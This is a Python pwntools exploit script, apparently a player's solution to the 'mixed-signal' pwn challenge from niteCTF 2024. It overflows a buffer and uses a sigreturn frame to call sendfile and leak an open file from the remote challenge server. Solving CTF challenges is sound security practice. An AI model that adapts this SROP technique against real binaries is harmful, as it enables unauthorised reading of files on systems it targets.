import argparse
import sys
sys.path.append('/home/coraline/CTF/pwn-dev/scripts/')
from pwn import *
from pwnfast import Pwn

_p = argparse.ArgumentParser()
_p.add_argument('-d', action="store_true")
_p.add_argument('-r', action="store_true")
args = _p.parse_args()

context.terminal = ['tmux', 'splitw', '-v', '-p', '90']
context.arch = 'amd64'

PROG = './chal'
conn = 'mixed-signal.chals.nitectf2024.live 1337'
# conn = 'localhost 1337'

### ------------------ EXPLOIT ------------------ ###

r = Pwn(PROG, conn=conn, ssl=True) if args.r else Pwn(PROG, gdb=True, debug=args.d)

syscall_ret = 0x40119a

pay = b'a' * (8*2)
pay += p64(r.sym['vuln'])
pay += p64(syscall_ret)

frame = SigreturnFrame(kernel='amd64')
frame.rax = 0x28
frame.rdi = 1
# On remote, there are other open files (sockets)
frame.rsi = 5 if args.r else 3
frame.rdx = 0
frame.r10 = 0x7fffffff
frame.rip = syscall_ret
frame.rsp = r.sym['data_start']

pay += bytes(frame)

r.gdb(r.call('vuln', 'read'))
r.sla(b'pickup!', pay)

r.s(b'b' * 0xf)

r.interactive()